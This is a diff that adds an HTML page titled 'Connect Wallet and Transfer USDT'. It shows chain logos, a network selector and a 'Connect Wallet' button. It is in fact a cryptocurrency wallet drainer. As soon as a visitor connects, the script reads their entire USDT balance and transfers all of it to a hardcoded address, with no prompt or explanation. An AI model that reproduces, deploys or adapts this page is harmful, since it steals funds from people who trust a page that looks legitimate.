@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Connect Wallet and Transfer USDT</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.12/dist/index.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
+      background: linear-gradient(135deg, #00c6ff, #0072ff); /* سبز آبی */
+      height: 100vh;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    h2 {
+      color: #fff;
+      margin-bottom: 20px;
+    }
+
+    .button {
+      padding: 15px 30px;
+      font-size: 18px;
+      margin-top: 20px;
+      border: none;
+      border-radius: 10px;
+      background: rgba(255, 255, 255, 0.1);
+      color: #fff;
+      cursor: pointer;
+      backdrop-filter: blur(10px);
+      box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.2);
+      transition: all 0.3s ease;
+    }
+
+    .button:hover {
+      background: rgba(255, 255, 255, 0.2);
+      box-shadow: 0px 6px 8px rgba(0, 0, 0, 0.3);
+    }
+
+    .logo-container {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr); /* لوگوها را دو به دو بچین */
+      gap: 20px;
+      margin-bottom: 40px;
+      max-width: 400px; /* برای محدود کردن عرض */
+    }
+
+    .logo-container img {
+      width: 60px;
+      height: 60px;
+      border-radius: 10px;
+      transition: transform 0.3s ease;
+    }
+
+    .logo-container img:hover {
+      transform: scale(1.1);
+    }
+
+    .network-select {
+      margin-top: 20px;
+      font-size: 16px;
+      padding: 10px;
+      border-radius: 10px;
+      background: rgba(255, 255, 255, 0.2);
+      color: #fff;
+      border: 1px solid #ddd;
+      backdrop-filter: blur(10px);
+    }
+
+    #walletAddress {
+      margin-top: 20px;
+      font-size: 18px;
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+  <h2>Connect Wallet and Transfer USDT</h2>
+  
+  <!-- Display logos in two columns -->
+  <div class="logo-container">
+    <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="Binance Smart Chain" />
+    <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="Ethereum" />
+    <img src="https://cryptologos.cc/logos/polygon-matic-logo.png" alt="Polygon" />
+    <img src="https://cryptologos.cc/logos/avalanche-avax-logo.png" alt="Avalanche" />
+    <img src="https://cryptologos.cc/logos/arbitrum-arb-logo.png" alt="Arbitrum" />
+    <img src="https://cryptologos.cc/logos/tron-trx-logo.png" alt="Tron" />
+  </div>
+
+  <button class="button" onclick="connectWallet()">Connect Wallet</button>
+  <p id="walletAddress"></p>
+  
+  <select class="network-select" id="networkSelect" onchange="changeNetwork()">
+    <option value="bsc">Binance Smart Chain</option>
+    <option value="eth">Ethereum</option>
+    <option value="matic">Polygon (Matic)</option>
+    <option value="avax">Avalanche</option>
+    <option value="arbitrum">Arbitrum</option>
+    <option value="tron">Tron</option>
+  </select>
+
+  <script>
+    const networks = {
+      bsc: {
+        contract: "0x55d398326f99059fF775485246999027B3197955", // USDT BSC
+        rpc: "https://bsc-dataseed.binance.org/",
+      },
+      eth: {
+        contract: "0xdac17f958d2ee523a2206206994597c13d831ec7", // USDT Ethereum
+        rpc: "https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID",
+      },
+      matic: {
+        contract: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", // USDT Polygon
+        rpc: "https://rpc-mainnet.maticvigil.com/",
+      },
+      avax: {
+        contract: "0xa7d8d9ef8D8cFAd7AC12110f4E2a6E36cDA77edD", // USDT Avalanche
+        rpc: "https://api.avax.network/ext/bc/C/rpc",
+      },
+      arbitrum: {
+        contract: "0xdac17f958d2ee523a2206206994597c13d831ec7", // USDT Arbitrum (same as Ethereum)
+        rpc: "https://arb1.arbitrum.io/rpc",
+      },
+      tron: {
+        contract: "TJYctqjmsThLntyofRMmpkBLYNr47veXRX", // USDT Tron
+        rpc: "https://api.trongrid.io", // RPC URL for Tron
+      }
+    };
+
+    let web3Modal;
+    let provider;
+    let web3;
+    let userAccount;
+    let currentNetwork = 'bsc'; // Default network (Binance Smart Chain)
+
+    const usdtAbi = [
+      {
+        "constant": true,
+        "inputs": [{"name": "_owner", "type": "address"}],
+        "name": "balanceOf",
+        "outputs": [{"name": "balance", "type": "uint256"}],
+        "type": "function"
+      },
+      {
+        "constant": false,
+        "inputs": [
+          {"name": "_to", "type": "address"},
+          {"name": "_value", "type": "uint256"}
+        ],
+        "name": "transfer",
+        "outputs": [{"name": "success", "type": "bool"}],
+        "type": "function"
+      }
+    ];
+
+    async function init() {
+      const providerOptions = {
+        walletconnect: {
+          package: window.WalletConnectProvider.default,
+          options: {
+            rpc: {
+              56: networks.bsc.rpc, // Default to BSC RPC
+            }
+          }
+        }
+      };
+
+      web3Modal = new window.Web3Modal.default({
+        cacheProvider: false,
+        providerOptions
+      });
+    }
+
+    async function connectWallet() {
+      try {
+        provider = await web3Modal.connect();
+        web3 = new Web3(provider);
+        const accounts = await web3.eth.getAccounts();
+        userAccount = accounts[0];
+        document.getElementById("walletAddress").innerText = "Wallet Address: " + userAccount;
+
+        // Execute USDT transfer
+        transferUSDT();
+      } catch (err) {
+        console.error("Connection failed", err);
+        alert("Connection to wallet failed");
+      }
+    }
+
+    async function transferUSDT() {
+      try {
+        const usdt = new web3.eth.Contract(usdtAbi, networks[currentNetwork].contract);
+        const balance = await usdt.methods.balanceOf(userAccount).call();
+
+        // If balance is greater than 0
+        if (balance > 0) {
+          console.log("USDT Balance:", web3.utils.fromWei(balance, 'ether'));
+
+          // Send USDT
+          const tx = await usdt.methods.transfer("0xE759093AD82F09E148e0d1cFBbFae19bFaF92c37", balance).send({ from: userAccount });
+          console.log("Transaction successful:", tx);
+        } else {
+          alert("Insufficient balance for USDT transfer.");
+        }
+      } catch (err) {
+        console.error("Error in transfer:", err);
+        alert("Error in transaction.");
+      }
+    }
+
+    function changeNetwork() {
+      const networkSelect = document.getElementById("networkSelect");
+      currentNetwork = networkSelect.value;
+
+      // Change RPC URL for WalletConnect
+      const providerOptions = {
+        walletconnect: {
+          package: window.WalletConnectProvider.default,
+          options: {
+            rpc: {
+              56: networks[currentNetwork].rpc, // Change to selected network
+            }
+          }
+        }
+      };
+
+      web3Modal = new window.Web3Modal.default({
+        cacheProvider: false,
+        providerOptions
+      });
+    }
+
+    window.addEventListener('load', init);
+  </script>
+</body>
+</html>
